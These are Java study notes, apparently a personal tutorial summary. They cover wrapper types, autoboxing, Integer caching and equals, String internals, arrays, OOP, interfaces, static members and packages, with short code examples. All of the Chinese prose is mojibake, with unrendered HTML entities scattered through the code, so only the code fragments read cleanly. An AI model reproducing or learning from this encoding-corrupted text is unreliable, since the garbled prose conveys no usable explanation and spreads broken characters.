æ‰€æœ‰çš„æ•´æ•°å’Œæµ®ç‚¹æ•°çš„åŒ…è£…ç±»å‹éƒ½ç»§æ‰¿è‡ªNumberï¼Œå› æ­¤ï¼Œå¯ä»¥éå¸¸æ–¹ä¾¿åœ°ç›´æ¥é€šè¿‡åŒ…è£…ç±»å‹è·å–å„ç§åŸºæœ¬ç±»å‹ // å‘ä¸Šè½¬å‹ä¸ºNumber: Number num = new Integer(999); // è·å–byte, int, long, float, double: byte b = num.byteValue(); int n = num.intValue(); long ln = num.longValue(); float f = num.floatValue(); double d = num.doubleValue(); ç”±äºjavaä¸­å¹¶ä¸å­˜åœ¨æ— ç¬¦å·æ•´å‹è¿™ä¸€è¯´ï¼Œå…¨éƒ¨éƒ½æ˜¯æœ‰æ•´å‹çš„ï¼Œéœ€è¦é€šè¿‡åŒ…è£…ç±»å‹çš„é™æ€æ–¹æ³•æ¥å®Œæˆï¼Œæ¯”å¦‚Byte.toUnsignedInt()\nintå’Œå¯¹åº”çš„Integerå¯ä»¥äº’ç›¸è½¬åŒ–ï¼Œç”šè‡³ç›´æ¥ä½¿ç”¨\nInteger n = 100; // ç¼–è¯‘å™¨è‡ªåŠ¨ä½¿ç”¨Integer.valueOf(int) int x = n; // ç¼–è¯‘å™¨è‡ªåŠ¨ä½¿ç”¨Integer.intValue() è¿™ç§ç›´æ¥æŠŠintå˜ä¸ºIntegerçš„èµ‹å€¼å†™æ³•ï¼Œç§°ä¸ºè‡ªåŠ¨è£…ç®±ï¼ˆAuto Boxingï¼‰ï¼›åè¿‡æ¥ï¼ŒæŠŠIntegerå˜ä¸ºintçš„èµ‹å€¼å†™æ³•ï¼Œç§°ä¸ºè‡ªåŠ¨æ‹†ç®±ï¼ˆAuto Unboxingï¼‰\næ³¨æ„ï¼šè‡ªåŠ¨è£…ç®±å’Œè‡ªåŠ¨æ‹†ç®±åªå‘ç”Ÿåœ¨ç¼–è¯‘é˜¶æ®µï¼Œç›®çš„æ˜¯ä¸ºäº†å°‘å†™ä»£ç ã€‚\nè£…ç®±å’Œæ‹†ç®±ä¼šå½±å“ä»£ç çš„æ‰§è¡Œæ•ˆç‡ï¼Œå› ä¸ºç¼–è¯‘åçš„classä»£ç æ˜¯ä¸¥æ ¼åŒºåˆ†åŸºæœ¬ç±»å‹å’Œå¼•ç”¨ç±»å‹çš„ã€‚å¹¶ä¸”ï¼Œè‡ªåŠ¨æ‹†ç®±æ‰§è¡Œæ—¶å¯èƒ½ä¼šæŠ¥NullPointerExceptionï¼ˆä¸¤ç§ç±»å‹å¯¹nullçš„å®¹å¿åº¦ä¸åŒ\npublic class Main { public static void main(String[] args) { Integer n = null; int i = n; } } // NullPointerException æ‰€æœ‰åŒ…è£…ç±»å‹éƒ½æ˜¯ä¸å˜ç±»ï¼Œå’ŒStringä¸€æ ·é€šè¿‡å†…éƒ¨çš„private final intå­—æ®µå®ç°ï¼Œæ— æ³•æ´¾ç”Ÿå­ç±» åˆ¤æ–­å€¼ç±»å‹çš„å˜é‡æ˜¯å¦ç›¸ç­‰å¯ç”¨==ï¼Œä½†æ˜¯åŒ…è£…ç±»å‹å¿…é¡»ç”¨equalsæ¯”è¾ƒï¼ˆå¼•ç”¨ç±»å‹å­˜åœ¨å€¼ç›¸ç­‰ä½†æŒ‡å‘ä¸åŒå¯¹è±¡çš„æƒ…å†µï¼‰ï¼ï¼ï¼è¯¦ç»†çš„æ¼”ç¤º public class Main { public static void main(String[] args) { Integer x = 127; Integer y = 127; Integer m = 99999; Integer n = 99999; System.out.println(\u0026#34;x == y: \u0026#34; + (x==y)); // true System.out.println(\u0026#34;m == n: \u0026#34; + (m==n)); // false System.out.println(\u0026#34;x.equals(y): \u0026#34; + x.equals(y)); // true System.out.println(\u0026#34;m.equals(n): \u0026#34; + m.equals(n)); // true } } ==æ¯”è¾ƒï¼Œè¾ƒå°çš„ä¸¤ä¸ªç›¸åŒçš„Integerè¿”å›trueï¼Œè¾ƒå¤§çš„ä¸¤ä¸ªç›¸åŒçš„Integerè¿”å›falseï¼Œè¿™æ˜¯å› ä¸ºIntegeræ˜¯ä¸å˜ç±»ï¼Œç¼–è¯‘å™¨æŠŠInteger x = 127;è‡ªåŠ¨å˜ä¸ºInteger x = Integer.valueOf(127);\nä¸ºäº†èŠ‚çœå†…å­˜ï¼ŒInteger.valueOf()å¯¹äºè¾ƒå°çš„æ•°ï¼Œå§‹ç»ˆè¿”å›ç›¸åŒçš„å®ä¾‹ï¼Œå› æ­¤==æ¯”è¾ƒâ€œæ°å¥½â€ä¸ºtrueï¼Œä½†æˆ‘ä»¬ç»ä¸èƒ½å› ä¸ºJavaæ ‡å‡†åº“çš„Integerå†…éƒ¨æœ‰ç¼“å­˜ä¼˜åŒ–å°±ç”¨==æ¯”è¾ƒï¼Œå¿…é¡»ç”¨equals()æ–¹æ³•æ¯”è¾ƒä¸¤ä¸ªInteger\nå› ä¸ºInteger.valueOf()å¯èƒ½å§‹ç»ˆè¿”å›åŒä¸€ä¸ªIntegerå®ä¾‹ï¼Œå› æ­¤ï¼Œåœ¨æˆ‘ä»¬è‡ªå·±åˆ›å»ºIntegerçš„æ—¶å€™ï¼Œä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼š Integer n = new Integer(100); Integer n = Integer.valueOf(100); æ–¹æ³•äºŒæ›´å¥½ï¼Œä¸ç”¨æ¯æ¬¡éƒ½newæ–°çš„å®ä¾‹è€Œæ˜¯ç›´æ¥ä½¿ç”¨é™æ€å·¥å‚æ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼Œå®ƒä¼šåšåˆ°å†…éƒ¨ä¼˜åŒ–ï¼Œå°½å¯èƒ½åœ°è¿”å›ç¼“å­˜çš„å®ä¾‹ä»¥èŠ‚çœå†…å­˜\nStringä½œå¼•ç”¨ç±»å‹ï¼Œç±»ä¼¼cä¸­çš„æŒ‡é’ˆï¼Œå†…éƒ¨å­˜å‚¨ä¸€ä¸ªæŒ‡å‘å†…å­˜ä¸­çš„åœ°å€ åŠ ä¸Šfinalè¡¨ç¤ºå¸¸é‡ï¼Œåˆ›å»ºå®ä¾‹åæ— æ³•ä¿®æ”¹ ç±»å‹åè¿‡é•¿æ—¶å¯ç”¨varä»£æ›¿ instanceof()ç¡®å®šç±»å‹ è¿ç®— æº¢å‡ºä¸æŠ¥é”™ï¼Œæ³¨æ„è‡ªæ£€ ä¼˜å…ˆçº§å¤ªå¤šè®°ä¸ä½ï¼Œç»Ÿä¸€åŠ æ‹¬å·å®Œäº‹äº† ä¸¤ç§ç±»å‹ä¸åŒçš„æ•°è¿›è¡Œè¿ç®—æ—¶ä¼šå­˜åœ¨ç±»å‹çš„éšå¼è½¬æ¢ï¼ˆshort+int -\u0026gt; int+intï¼‰ï¼Œæ³¨æ„è¿ç®—ç²¾åº¦ æ•´æ•°è¿ç®—å¾ˆå‡†ç¡®ï¼Œæ²¡æœ‰å¿…è¦ä¸ºäº†èŠ‚çœå†…å­˜è€Œä½¿ç”¨byteå’Œshortè¿›è¡Œæ•´æ•°è¿ç®— æ•´æ•°è¿ç®—åœ¨é™¤æ•°ä¸º0æ—¶ä¼šæŠ¥é”™ï¼Œè€Œæµ®ç‚¹æ•°è¿ç®—åœ¨é™¤æ•°ä¸º0æ—¶ï¼Œä¸ä¼šæŠ¥é”™ï¼Œè¿”å›NAN or Infinity or -Infinity å¸ƒå°”å…³ç³»å’Œä¸‰å…ƒè¿ç®—ä¸­æ³¨æ„é€»è¾‘çŸ­è·¯ ä¸‰å…ƒè¿ç®—b ? x : yåé¢çš„ç±»å‹å¿…é¡»ç›¸åŒ å­—ç¬¦\u0026amp;å­—ç¬¦ä¸² Javaçš„Stringå’Œcharåœ¨å†…å­˜ä¸­æ€»æ˜¯ä»¥Unicodeç¼–ç è¡¨ç¤º å­—ç¬¦charç”¨''ï¼Œå­—ç¬¦ä¸²ç”¨\u0026quot;\u0026quot;ï¼ˆç©ºå­—ç¬¦ä¸²ä¸ç­‰äºnullï¼‰ï¼Œå­—ç¬¦ä¸²æ‹¼æ¥å­˜åœ¨ç±»å‹éšå¼è½¬æ¢ï¼Œ\u0026quot;\u0026quot;\u0026quot; \u0026quot;\u0026quot;\u0026quot;å†™å¤šè¡Œå­—ç¬¦ä¸²ï¼ˆåŒpyï¼‰ javaä¸­çš„å­—ç¬¦ä¸²èµ‹å€¼æ“ä½œå¯ç›´æ¥è”æƒ³cçš„æŒ‡é’ˆè¿›è¡Œç†è§£ï¼Œé€šè¿‡å†…éƒ¨çš„private final char[]å­—æ®µ ä»¥åŠæ²¡æœ‰ä»»ä½•ä¿®æ”¹char[]çš„æ–¹æ³•å®ç°å­—ç¬¦ä¸²çš„ä¸å¯å˜æ€§ï¼›åŸºäºè¿™ä¸€ç‚¹ï¼Œå¦‚æœä¼ å…¥çš„å¯¹è±¡æœ‰å¯èƒ½æ”¹å˜ï¼Œæˆ‘ä»¬éœ€è¦å¤åˆ¶è€Œä¸æ˜¯ç›´æ¥å¼•ç”¨ å­—ç¬¦ä¸²æ¯”è¾ƒå¿…é¡»ç”¨equals()æˆ–equalsIgnoreCase()ï¼Œä¸å¯å·æ‡’ç”¨== æ›´å¤šå­—ç¬¦ä¸²çš„ç”¨æ³•å¯å‡ ä¹ç­‰åŒäºPythonï¼Œä¸åˆ—ä¸¾\nStringå’Œchar[]ç±»å‹å¯ä»¥äº’ç›¸è½¬æ¢ char[] cs = \u0026#34;Hello\u0026#34;.toCharArray(); // String -\u0026gt; char[] String s = new String(cs); // char[] -\u0026gt; String å¦‚æœä¿®æ”¹äº†char[]æ•°ç»„ï¼ŒStringå¹¶ä¸ä¼šæ”¹å˜ public class Main { public static void main(String[] args) { char[] cs = \u0026#34;Hello\u0026#34;.toCharArray(); String s = new String(cs); System.out.println(s); cs[0] = \u0026#39;X\u0026#39;; System.out.println(s); } } è¿™æ˜¯å› ä¸ºé€šè¿‡new String(char[])åˆ›å»ºæ–°çš„Stringå®ä¾‹æ—¶ï¼Œå®ƒå¹¶ä¸ä¼šç›´æ¥å¼•ç”¨ä¼ å…¥çš„char[]æ•°ç»„ï¼Œè€Œæ˜¯ä¼šå¤åˆ¶ä¸€ä»½ï¼Œæ‰€ä»¥ï¼Œä¿®æ”¹å¤–éƒ¨çš„char[]æ•°ç»„ä¸ä¼šå½±å“Stringå®ä¾‹å†…éƒ¨çš„char[]æ•°ç»„ï¼Œå› ä¸ºè¿™æ˜¯ä¸¤ä¸ªä¸åŒçš„æ•°ç»„\næ—©æœŸçš„Stringæ€»ä»¥char[]è¿›è¡Œå­˜å‚¨ public final class String { private final char[] value; private final int offset; private final int count; } è€Œè¾ƒæ–°çš„JDKç‰ˆæœ¬çš„Stringåˆ™ä»¥byte[]å­˜å‚¨ï¼šå¦‚æœStringä»…åŒ…å«ASCIIå­—ç¬¦ï¼Œåˆ™æ¯ä¸ªbyteå­˜å‚¨ä¸€ä¸ªå­—ç¬¦ï¼Œå¦åˆ™ï¼Œæ¯ä¸¤ä¸ªbyteå­˜å‚¨ä¸€ä¸ªå­—ç¬¦ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†èŠ‚çœå†…å­˜ï¼Œå› ä¸ºå¤§é‡çš„é•¿åº¦è¾ƒçŸ­çš„Stringé€šå¸¸ä»…åŒ…å«ASCIIå­—ç¬¦\npublic final class String { private final byte[] value; private final byte coder; // 0 = LATIN1, 1 = UTF16 å¯¹äºä½¿ç”¨è€…æ¥è¯´ï¼ŒStringå†…éƒ¨çš„ä¼˜åŒ–ä¸å½±å“ä»»ä½•å·²æœ‰ä»£ç ï¼Œå› ä¸ºå®ƒçš„publicæ–¹æ³•ç­¾åæ˜¯ä¸å˜çš„\næ•°ç»„ æ–°å»ºæ•°ç»„int[] n = new int[5];ï¼Œå¤§å°ä¸å¯å˜ï¼Œä¸ºå¼•ç”¨ç±»å‹ å¯¹äºæ•°ç»„å…ƒç´ ï¼ˆæˆ–æ‰€æœ‰å¯è¿­ä»£çš„æ•°æ®ç±»å‹ï¼‰çš„éå†ç›´æ¥ä½¿ç”¨for(int n:na){}ï¼Œç¼ºç‚¹æ˜¯æ— æ³•æŒ‡å®šéå†é¡ºåºï¼Œæ— æ³•è·å–æ•°ç»„ç´¢å¼•ï¼ˆnç›´æ¥ä»£è¡¨å…ƒç´ ï¼‰ å¿«é€Ÿæ‰“å°æ•°ç»„å†…å®¹System.out.println(Arrays.toString(ns)); å¿«é€Ÿæ‰“å°äºŒç»´æ•°ç»„å†…å®¹System.out.println(Arrays.deepToString(ns)); å¯å˜å‚æ•°ç”¨ç±»å‹...å®šä¹‰ï¼Œå¯å˜å‚æ•°ç›¸å½“äºæ•°ç»„ç±»å‹ æµç¨‹æ§åˆ¶ è¯»å–è¾“å…¥éœ€è¦import java.util.Scannerï¼Œç”±Scannerå¯¹è±¡è¿›è¡Œè¯»å…¥æ“ä½œ import java.util.Scanner; public class hello { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); System.out.print(\u0026#34;Input your name: \u0026#34;); String name = scanner.nextLine(); System.out.print(\u0026#34;Input your age: \u0026#34;); int age = scanner.nextInt(); System.out.printf(\u0026#34;Hi, %s, you are %d\\n\u0026#34;, name, age); } } switchè¯­å¥ä¸è¦å¿˜breakï¼Œcaseä¸ç”¨èŠ±æ‹¬å· defaultè¯­å¥ï¼Œå¯ä»¥åœ¨æ¼å†™æŸä¸ªæšä¸¾å¸¸é‡æ—¶è‡ªåŠ¨æŠ¥é”™ï¼Œä»è€ŒåŠæ—¶å‘ç°é”™è¯¯ OOPåŸºç¡€ ç±»\u0026amp;å®ä¾‹ å¯¹è±¡é new ä¸€ä¸ªjavaæºæ–‡ä»¶å¯ä»¥åŒ…å«å¤šä¸ªç±»çš„å®šä¹‰ï¼Œä½†åªèƒ½å®šä¹‰ä¸€ä¸ªpublicç±»ï¼Œä¸”publicç±»åå¿…é¡»ä¸æ–‡ä»¶åä¸€è‡´ï¼›å¦‚æœè¦å®šä¹‰å¤šä¸ªpublicç±»ï¼Œå¿…é¡»æ‹†åˆ°å¤šä¸ªJavaæºæ–‡ä»¶ä¸­ æ–¹æ³• è¯­æ³• ä¿®é¥°ç¬¦ æ–¹æ³•è¿”å›ç±»å‹ æ–¹æ³•å(æ–¹æ³•å‚æ•°åˆ—è¡¨) { è‹¥å¹²æ–¹æ³•è¯­å¥; return æ–¹æ³•è¿”å›å€¼; } // æ— return è¿”å›ç±»å‹ä¸ºvoid å˜é‡è®¾ä¸ºprivateåå¯ä»¥é€šè¿‡publicå¯¹å¤–çš„æ–¹æ³•é—´æ¥ä¿®æ”¹ æ²¡äº‹å„¿å°±å°½å¯èƒ½å°‘ç”¨publicï¼Œå°‘æš´éœ²å¯¹å¤–çš„æ–¹æ³• ä¸ç±»åç›¸åŒçš„æ–¹æ³•ä½œä¸ºconstructæ„é€ æ–¹æ³•ï¼Œæ— è¿”å›å€¼ å…ˆåˆå§‹åŒ–å­—æ®µï¼Œå†æ‰§è¡Œæ„é€ æ–¹æ³•ï¼ˆå¯è¦†ç›–å‰é¢çš„ å¯å®šä¹‰å¤šä¸ªæ„é€ æ–¹æ³•ï¼ˆä¼ å…¥å‚æ•°ç±»å‹ æ•°é‡ä¸åŒï¼‰ï¼Œnewæ—¶ä¼šè‡ªåŠ¨åŒ¹é…ï¼›ä¸€ä¸ªæ„é€ æ–¹æ³•å¯ä»¥è°ƒç”¨å…¶ä»–æ„é€ æ–¹æ³•ï¼ˆä¾¿äºä»£ç å¤ç”¨ï¼‰ï¼Œè¯­æ³• class Person { private String name; private int age; public Person(String name, int age) { this.name = name; this.age = age; } public Person(String name) { this(name, 18); // è°ƒç”¨å¦ä¸€ä¸ªæ„é€ æ–¹æ³•Person(String, int) } public Person() { this(\u0026#34;Unnamed\u0026#34;); // è°ƒç”¨å¦ä¸€ä¸ªæ„é€ æ–¹æ³•Person(String) } } éæ„é€ æ–¹æ³•ä¹Ÿå¯æœ‰å¤šä¸ªé‡åçš„ï¼ˆå‚æ•°ä¸åŒ è¿”å›å€¼é€šå¸¸ç›¸åŒï¼‰ï¼Œç§°ä¸ºæ–¹æ³•é‡è½½(Overload)ï¼Œä¾¿äºç”¨ä¸€ä¸ªåå­—å¤„ç†å¤šç§å‚æ•°è¾“å…¥ ç»§æ‰¿\u0026amp;å¤šæ€ ä½¿ç”¨extendså…³é”®å­—ï¼Œä¾‹class Student extends Person subclass == extended class; super class == parent class == base class å­ç±»ä¸å¯è®¿é—®çˆ¶ç±»çš„privateå­—æ®µå’Œæ–¹æ³•ï¼Œä¸èƒ½è¦†å†™çˆ¶ç±»å¸¦æœ‰finalå…³é”®å­—çš„æ–¹æ³•ï¼Œä¸èƒ½ç»§æ‰¿å¸¦æœ‰finalçš„ç±»ï¼Œä¸èƒ½é‡æ–°èµ‹å€¼å¸¦æœ‰finalçš„å­—æ®µ privateè®¿é—®æƒé™è¢«é™å®šåœ¨classçš„å†…éƒ¨ï¼Œè€Œä¸”ä¸æ–¹æ³•å£°æ˜é¡ºåºæ— å…³ï¼›å¦‚æœä¸€ä¸ªç±»å†…éƒ¨è¿˜å®šä¹‰äº†nested classåµŒå¥—ç±»ï¼Œé‚£ä¹ˆï¼ŒåµŒå¥—ç±»æ‹¥æœ‰è®¿é—®privateçš„æƒé™ å®šä¹‰ä¸ºprotectedçš„å­—æ®µå’Œæ–¹æ³•å¯ä»¥è¢«å­ç±»è®¿é—®ï¼Œä»¥åŠå­ç±»çš„å­ç±» ç»§æ‰¿ä¹‹åsuper.name, this.name, nameéƒ½æ˜¯ä¸€ä¸ªæ„æ€ï¼Œä½†å¦‚æœå­˜åœ¨æ–¹æ³•è¦†å†™åè°ƒç”¨çˆ¶ç±»æ–¹æ³•å°±å¿…é¡»ç”¨super.nameï¼ˆè”æƒ³NodeJSçš„.call, .apply å¼‚æ›²åŒå·¥ä¹‹å¦™ï¼‰ æœªæ³¨æ˜extends xxxçš„ç±»è‡ªåŠ¨è¢«è¡¥ä¸Šäº†extends Objectï¼Œæœ€é¡¶å±‚çš„objectä¹Ÿæ˜¯å¯ä»¥è¢«è¦†å†™çš„ ä»»ä½•ç±»çš„æ„é€ æ–¹æ³•ä¸­ç¬¬ä¸€è¡Œè¯­å¥å¿…é¡»æ˜¯è°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œå¦‚æœªæ³¨æ˜ä¼šè‡ªåŠ¨è¡¥ä¸Šsuper();ï¼Œæ‰€ä»¥å¦‚æœçˆ¶ç±»æ²¡æœ‰é»˜è®¤çš„æ„é€ æ–¹æ³•ï¼Œå­ç±»å°±å¿…é¡»æ˜¾å¼è°ƒç”¨super()å¹¶ç»™å‡ºå‚æ•°ä»¥ä¾¿è®©ç¼–è¯‘å™¨å®šä½åˆ°çˆ¶ç±»çš„ä¸€ä¸ªåˆé€‚çš„æ„é€ æ–¹æ³•â€”â€”â€”â€”ä¸€å¥è¯ï¼šå­ç±»ä¸ç»§æ‰¿çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œæ˜¯è‡ªåŠ¨ç”Ÿæˆçš„ï¼ˆè”æƒ³Nodejsæ‰§è¡Œä»£ç æ—¶çš„wrapperï¼‰ Java15ä¹‹åå…è®¸sealedä¿®é¥°classï¼Œå¹¶å¯é€šè¿‡permitsé™åˆ¶èƒ½ä»è¯¥ç±»ç»§æ‰¿çš„å­ç±»åç§°ï¼ˆç›®å‰ä¸ºé¢„è§ˆçŠ¶æ€ï¼Œå¯å¼€å¯--enable-previewå’Œ--source 15å¼€å¯ï¼‰ public sealed class Shape permits Rect, Circle, Triangle { // xxx } å‘ä¸Šè½¬å‹åŸºæœ¬æ— é—®é¢˜ï¼Œå‘ä¸‹å¯èƒ½å›æŠ¥ClassCastExceptionçš„é”™è¯¯ï¼Œç”¨instanceofåˆ¤æ–­ä¸€ä¸ªå®ä¾‹ç©¶ç«Ÿæ˜¯ä¸æ˜¯æŸç§ç±»å‹ å­ç±»ä¸çˆ¶ç±»æ–¹æ³•ç­¾åå®Œå…¨ç›¸åŒæ—¶å¯è¦†å†™(Override)ï¼ŒåŠ ä¸Š@Overrideå¯ä»¥è®©ç¼–è¯‘å™¨å¸®åŠ©æ£€æŸ¥æ˜¯å¦è¿›è¡Œäº†æ­£ç¡®çš„è¦†å†™ï¼ˆéå¿…è¦ï¼‰ newæ¥çš„å¯¹è±¡å¦‚æœæŒ‡å®šçš„ç±»å‹ä¸åŒï¼Œå®é™…è°ƒç”¨å…¶æ–¹æ³•æ—¶ä¼šä¸åŒï¼Œrunèµ·æ¥æ‰çŸ¥é“å…·ä½“ç”¨çš„å•¥ï¼Œè¿™ä¸ªå«å¤šæ€(Polymorphic)ï¼Œæœ‰åŠ©äºå®ç°åŠŸèƒ½æ‹“å±•ï¼Œå°è£…åº•å±‚é€»è¾‘ ä¼˜åŒ–äº¤äº’ æŠ½è±¡ç±»\u0026amp;æ¥å£ æŠ½è±¡ç±»ä¸å®ç°ä»»ä½•åŠŸèƒ½ ä»…ä¸ºäº†å®šä¹‰æ–¹æ³•ç­¾åï¼Œç›®çš„å°±æ˜¯ä¸ºäº†è®©å­ç±»ç»§æ‰¿å¹¶è¦†ç›–ï¼Œæ³¨æ„è¿™ä¸ªç±»æœ¬èº«ä¹Ÿè¦å£°æ˜ä¸ºabstractä½œæŠ½è±¡ç±» abstract class Person { public abstract void run();\t// æ— å­å¥ } å½“æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªæŠ½è±¡ç±»å’ŒNä¸ªå…·ä½“ç±»ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æŠ½è±¡ç±»ä½œå¼•ç”¨ç±»å‹å»å¼•ç”¨å…·ä½“ç±»çš„å­ç±»å®ä¾‹ï¼Œå¥½å¤„åœ¨äºå¯¹å®ä¾‹çš„æ–¹æ³•è¿›è¡Œè°ƒç”¨æ—¶å¹¶ä¸å…³å¿ƒæŠ½è±¡ç±»å‹å˜é‡çš„å…·ä½“å­ç±»å‹ Person s = new Student(); Person t = new Teacher(); // ä¸å…³å¿ƒPersonå˜é‡çš„å…·ä½“å­ç±»å‹: s.run(); t.run(); // åŒæ ·ä¸å…³å¿ƒæ–°çš„å­ç±»æ˜¯å¦‚ä½•å®ç°run()æ–¹æ³•çš„ï¼š Person e = new Employee(); e.run(); è¿™ç§å°½é‡å¼•ç”¨é«˜å±‚ç±»å‹ï¼Œé¿å…å¼•ç”¨å®é™…å­ç±»å‹çš„æ–¹å¼ï¼Œç§°ä¹‹ä¸ºé¢å‘æŠ½è±¡ç¼–ç¨‹ï¼Œæœ¬è´¨ï¼š\nä¸Šå±‚ä»£ç åªå®šä¹‰è§„èŒƒ(abstract class Person)ï¼Œä¸éœ€è¦å­ç±»å°±å¯ä»¥å®ç°ä¸šåŠ¡é€»è¾‘ï¼ˆæ­£å¸¸ç¼–è¯‘ï¼‰ï¼Œå…·ä½“çš„ä¸šåŠ¡é€»è¾‘ç”±ä¸åŒçš„å­ç±»å®ç°ï¼Œè°ƒç”¨è€…å¹¶ä¸å…³å¿ƒ\ninterfaceæ¯”æŠ½è±¡ç±»è¿˜æŠ½è±¡çš„çº¯æŠ½è±¡æ¥å£ï¼Œæ— å®ä¾‹å­—æ®µï¼Œæ‰€æœ‰æ–¹æ³•éƒ½é»˜è®¤public abstract interface Person { void run(); String getName(); } å½“å…·ä½“ç±»å®ç°ä¸€ä¸ªæ¥å£æ—¶éœ€è¦ç”¨implements class Student implements Person { private String name; public Student(String name) { this.name = name; } @Override public void run() { System.out.println(this.name + \u0026#34; run\u0026#34;); } @Override public String getName() { return this.name; } } ä¸€ä¸ªç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£ï¼Œä¸€ä¸ªæ¥å£ä¹Ÿå¯ä»¥ç»§æ‰¿è‡ªå¦ä¸€ä¸ªæ¥å£ class Student implements Person, Hello { // å®ç°äº†ä¸¤ä¸ªinterface ... } interface Person extends Hello {\t// ç»§æ‰¿å¦ä¸€ä¸ªæ¥å£ void run(); String getName(); } åœ¨æ¥å£ä¸­ï¼Œå¯ä»¥å®šä¹‰defaultæ–¹æ³•ï¼›defaultæ–¹æ³•å’ŒæŠ½è±¡ç±»çš„æ™®é€šæ–¹æ³•æ˜¯æœ‰æ‰€ä¸åŒçš„ã€‚å› ä¸ºinterfaceæ²¡æœ‰å­—æ®µï¼Œdefaultæ–¹æ³•æ— æ³•è®¿é—®å­—æ®µï¼Œè€ŒæŠ½è±¡ç±»çš„æ™®é€šæ–¹æ³•å¯ä»¥è®¿é—®å®ä¾‹å­—æ®µ(Java\u0026gt;=1.8) é™æ€å­—æ®µ\u0026amp;é™æ€æ–¹æ³• ç”¨staticå…³é”®å­—ä¿®é¥°çš„å­—æ®µå¤„äºåŒä¸€ä¸ªå…±äº«ä½œç”¨åŸŸä¸­\nä¸æ¨èç”¨å®ä¾‹.é™æ€å­—æ®µå»è®¿é—®é™æ€å­—æ®µï¼Œå› ä¸ºåœ¨javaä¸­å®ä¾‹å¯¹è±¡å¹¶æ²¡æœ‰é™æ€å­—æ®µ(å®é™…)ï¼Œä»£ç ä¸­å¯ä»¥è®¿é—®æ˜¯å› ä¸ºç¼–è¯‘å™¨å¯ä»¥æ ¹æ®å®ä¾‹ç±»å‹è‡ªåŠ¨è½¬æ¢ä¸ºç±»å.é™æ€å­—æ®µæ¥è®¿é—®\næ¨èç”¨ç±»åæ¥è®¿é—®é™æ€å­—æ®µï¼Œå¯ä»¥å°†å…¶ç†è§£ä¸ºç±»æœ¬èº«çš„å­—æ®µ\nè°ƒç”¨å®ä¾‹æ–¹æ³•å¿…é¡»é€šè¿‡ä¸€ä¸ªå®ä¾‹å˜é‡ï¼Œè€Œè°ƒç”¨é™æ€æ–¹æ³•åˆ™ä¸éœ€è¦å®ä¾‹å˜é‡ï¼Œé€šè¿‡ç±»åå°±å¯ä»¥è°ƒç”¨\npublic class Main { public static void main(String[] args) { Person.setNumber(99); System.out.println(Person.number); } } class Person { public static int number; public static void setNumber(int value) { number = value; } } é™æ€æ–¹æ³•å†…éƒ¨æ— æ³•è®¿é—®thisï¼Œä¹Ÿæ— æ³•è®¿é—®å®ä¾‹å­—æ®µï¼Œåªèƒ½è®¿é—®é™æ€å­—æ®µ é™æ€æ–¹æ³•å¸¸ç”¨äºå·¥å…·ç±»ï¼Œæ¯”å¦‚Arrays.sort()å’ŒMath.random()ï¼›javaç¨‹åºå…¥å£çš„mainä¹Ÿæ˜¯é™æ€æ–¹æ³•å™¢ å¯¹äºæ¥å£è€Œè¨€è™½ç„¶ä¸èƒ½æœ‰å®ä¾‹å­—æ®µï¼Œä½†æ˜¯å¯ä»¥æœ‰public static finalåŠ æŒçš„é™æ€å­—æ®µ public interface Person { public static final int MALE = 1; public static final int FEMALE = 2; } // å¯ç®€å†™ public interface Person { // ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨åŠ ä¸Špublic statc final: int MALE = 1; int FEMALE = 2; } åŒ… ä½¿ç”¨packageåŒ…æ¥è§£å†³åå­—å†²çªï¼ˆå„ä¸ªè¯­è¨€éƒ½æœ‰äº† å¾ˆå¥½æ‡‚ï¼‰ï¼Œå¯ä»¥ç”¨ç±»çš„å…¨å åŒ…æ²¡æœ‰çˆ¶å­å…³ç³»ï¼java.utilå’Œjava.util.zipæ˜¯ä¸åŒçš„åŒ…ï¼Œä¸¤è€…æ²¡æœ‰ä»»ä½•ç»§æ‰¿å…³ç³» æ‰€æœ‰Javaæ–‡ä»¶å¯¹åº”çš„ç›®å½•å±‚æ¬¡è¦å’ŒåŒ…çš„å±‚æ¬¡ä¸€è‡´ï¼Œç¼–è¯‘åçš„.classæ–‡ä»¶ä¹Ÿéœ€è¦æŒ‰ç…§åŒ…ç»“æ„å­˜æ”¾ ä½äºåŒä¸€ä¸ªåŒ…çš„ç±»ï¼Œå¯ä»¥è®¿é—®åŒ…ä½œç”¨åŸŸçš„å­—æ®µå’Œæ–¹æ³•ã€‚ä¸ç”¨publicã€protectedã€privateä¿®é¥°çš„å­—æ®µå’Œæ–¹æ³•å°±æ˜¯åŒ…ä½œç”¨åŸŸ import staticå¯ä»¥å¯¼å…¥å¯ä»¥å¯¼å…¥ä¸€ä¸ªç±»çš„é™æ€å­—æ®µå’Œé™æ€æ–¹æ³• Javaç¼–è¯‘å™¨æœ€ç»ˆç¼–è¯‘å‡ºçš„.classæ–‡ä»¶åªä½¿ç”¨å®Œæ•´ç±»å(è¶…é•¿)ï¼Œæ‰€ä»¥ç¼–è¯‘å™¨åœ¨é‡åˆ°classåç§°æ—¶å¦‚æœéå®Œæ•´ç±»åï¼ŒæŒ‰ç…§ å½“å‰package-\u0026gt;importçš„åŒ…-\u0026gt;java.langåŒ… çš„é¡ºåºè¿›è¡ŒæŸ¥æ‰¾ // Main.java package test; import java.text.Format; public class Main { public static void main(String[] args) { java.util.List list; // okï¼Œä½¿ç”¨å®Œæ•´ç±»å -\u0026gt; java.util.List Format format = null; // okï¼Œä½¿ç”¨importçš„ç±» -\u0026gt; java.text.Format String s = \u0026#34;hi\u0026#34;; // okï¼Œä½¿ç”¨java.langåŒ…çš„String -\u0026gt; java.lang.String System.out.println(s); // okï¼Œä½¿ç”¨java.langåŒ…çš„System -\u0026gt; java.lang.System MessageFormat mf = null; // ç¼–è¯‘é”™è¯¯ï¼šæ— æ³•æ‰¾åˆ°MessageFormat: MessageFormat cannot be resolved to a type } } ç¼–å†™classæ—¶ï¼Œç¼–è¯‘å™¨è‡ªåŠ¨å¸®æˆ‘ä»¬import java.lang.*(ä¸åŒ…å«java.lang.reflectè¿™æ ·çš„åŒ…)å’Œimportå½“å‰packageçš„å…¶å®ƒclass 